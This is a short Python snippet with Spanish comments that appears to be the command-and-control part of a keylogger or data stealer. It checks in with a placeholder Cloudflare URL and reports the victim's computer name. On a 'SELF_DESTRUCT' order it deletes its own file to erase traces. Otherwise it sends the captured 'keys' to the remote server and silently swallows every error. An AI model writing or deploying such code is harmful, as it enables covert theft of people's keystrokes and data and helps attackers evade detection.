import os, sys

def send_data(keys):
    try:
        url = f"https://tu-url-cloudflare.com/check.php?host={os.getenv('COMPUTERNAME')}"
        response = requests.get(url)
        
        if "SELF_DESTRUCT" in response.text:
            print("Orden recibida. Borrando huellas...")
            # Borrar el archivo actual y salir
            os.remove(sys.argv[0]) 
            sys.exit()
            
        # Si no hay orden de kill, enviar los datos normalmente al confirm.php
        requests.get(f"https://tu-url-cloudflare.com/confirm.php?data={keys}")
    except:
        pass
